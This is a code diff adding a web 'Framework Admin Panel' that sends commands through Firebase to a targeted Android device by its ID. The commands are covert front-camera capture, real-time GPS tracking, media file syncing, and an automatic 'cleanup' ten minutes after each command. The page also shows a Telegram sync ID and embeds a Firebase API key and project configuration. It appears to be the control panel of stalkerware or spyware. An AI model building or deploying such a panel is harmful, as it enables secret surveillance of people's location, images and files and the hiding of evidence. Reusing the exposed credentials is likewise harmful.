@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Framework Control Center</title>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+    <style>
+        :root {
+            --bg: #0a0a0c;
+            --primary: #00f2fe;
+            --card: rgba(255,255,255,0.05);
+            --text: #e0e0e0;
+        }
+        body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
+        .container { max-width: 800px; width: 90%; margin-top: 50px; }
+        .glass-card { background: var(--card); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); border-radius: 15px; padding: 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        h1 { color: var(--primary); text-align: center; margin-bottom: 40px; }
+        .device-selector { margin-bottom: 30px; }
+        select, button { width: 100%; padding: 15px; margin-top: 10px; border-radius: 8px; border: none; font-size: 16px; }
+        select { background: #1a1a1c; color: white; }
+        button { background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%); color: white; font-weight: bold; cursor: pointer; transition: 0.3s; margin-bottom: 10px; }
+        button:hover { filter: brightness(1.1); transform: translateY(-2px); }
+        .status { margin-top: 20px; font-size: 14px; color: #909090; text-align: center; }
+        .log { margin-top: 30px; background: black; color: #00ff00; font-family: monospace; padding: 15px; border-radius: 8px; font-size: 12px; height: 150px; overflow-y: auto; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Framework Admin Panel</h1>
+        
+        <div class="glass-card">
+            <div class="device-selector">
+                <label>Target Device ID</label>
+                <input type="text" id="deviceId" placeholder="Enter Device Android ID" style="width: 100%; padding: 15px; background: #1a1a1c; color: white; border: none; border-radius: 8px; margin-top: 10px; box-sizing: border-box;">
+            </div>
+
+            <div class="controls">
+                <button onclick="sendCommand('CAP_FRONT')">📸 Capture Front Photo</button>
+                <button onclick="sendCommand('GET_GPS')">📍 Track Real-time Location</button>
+                <button onclick="sendCommand('SYNC_MEDIA')">📂 Sync Media Files</button>
+                <button onclick="sendCommand('CLEANUP')">🧹 Manual Cleanup</button>
+            </div>
+
+            <div style="margin-top: 15px; font-size: 12px; color: var(--primary);">
+                📡 Telegram Sync: <span style="color: #00ff00;">Active</span> (ID: 7278927637)
+            </div>
+
+            <div class="status" id="status">Ready for commands...</div>
+            <div id="timer" style="text-align: center; font-size: 12px; margin-top: 10px; color: #ff4d4d;"></div>
+            <div class="log" id="log">Console initialized...</div>
+        </div>
+    </div>
+
+    <script>
+        // Use the config provided by the user
+        const firebaseConfig = {
+            apiKey: "AIzaSyDAyYrsu-ls77MdrUhiXA0sDzmu5RoZU5I",
+            authDomain: "gen-lang-client-0564490234.firebaseapp.com",
+            projectId: "gen-lang-client-0564490234",
+            storageBucket: "gen-lang-client-0564490234.firebasestorage.app",
+            messagingSenderId: "308997657698",
+            appId: "1:308997657698:web:0697982878bdb4976f6d3b",
+            databaseURL: "https://gen-lang-client-0564490234-default-rtdb.firebaseio.com"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        function log(msg) {
+            const l = document.getElementById('log');
+            l.innerHTML += `> ${new Date().toLocaleTimeString()}: ${msg}<br>`;
+            l.scrollTop = l.scrollHeight;
+        }
+
+        function sendCommand(cmd) {
+            const deviceId = document.getElementById('deviceId').value;
+            if(!deviceId) {
+                alert("Please enter a Device ID!");
+                return;
+            }
+
+            log(`Sending command: ${cmd} to ${deviceId}`);
+            database.ref('sys_commands/' + deviceId).set({
+                trigger: cmd,
+                timestamp: Date.now()
+            }).then(() => {
+                document.getElementById('status').innerText = `Command ${cmd} sent!`;
+                log(`Command ${cmd} acknowledged.`);
+                
+                if(cmd !== 'CLEANUP') {
+                    startAutoDeleteTimer(deviceId);
+                }
+            });
+        }
+
+        function startAutoDeleteTimer(deviceId) {
+            let seconds = 600; // 10 minutes
+            const timerEl = document.getElementById('timer');
+            
+            const interval = setInterval(() => {
+                seconds--;
+                const mins = Math.floor(seconds / 60);
+                const secs = seconds % 60;
+                timerEl.innerText = `Auto-Delete (Cleanup) in: ${mins}:${secs < 10 ? '0' : ''}${secs}`;
+                
+                if (seconds <= 0) {
+                    clearInterval(interval);
+                    timerEl.innerText = "Triggering Auto-Cleanup...";
+                    sendCommand('CLEANUP');
+                }
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
